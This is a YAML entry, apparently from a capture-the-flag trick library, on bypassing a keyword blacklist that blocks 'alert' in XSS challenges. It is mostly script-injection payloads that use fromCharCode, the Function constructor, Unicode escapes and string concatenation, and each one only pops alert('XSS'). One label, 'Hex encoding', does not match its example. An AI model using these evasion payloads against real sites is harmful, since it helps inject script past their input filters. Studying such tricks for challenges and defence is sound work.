name: xss_alert_blacklist_bypass
category: web
tags: [xss, blacklist_bypass, alert, injection]
indicators:
  - "XSS with alert function blacklisted"
  - "Blacklist check: word in msg.lower()"
  - "Need to trigger alert('XSS')"

tricks:
  - name: "Bypass alert blacklist with String.fromCharCode"
    when: "alert is blacklisted but eval is allowed"
    how: "Use eval with String.fromCharCode to construct alert"
    payload: |
      # alert('XSS') = String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41)
      <script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>

  - name: "Bypass with Function constructor"
    when: "alert is blacklisted"
    how: "Use constructor to build function"
    payload: |
      <script>[].constructor.constructor('al'+'ert("XSS")')();</script>
      <script>Function('al'+'ert("XSS")')();</script>

  - name: "Other bypass techniques"
    when: "Various blacklist scenarios"
    how: "Use different encoding or concatenation"
    payload: |
      # Unicode escape
      <script>\u0061lert('XSS')</script>
      
      # Hex encoding
      <script>window['al'+'ert']('XSS')</script>
      
      # Template literals
      <script>window[`al`+`ert`]('XSS')</script>
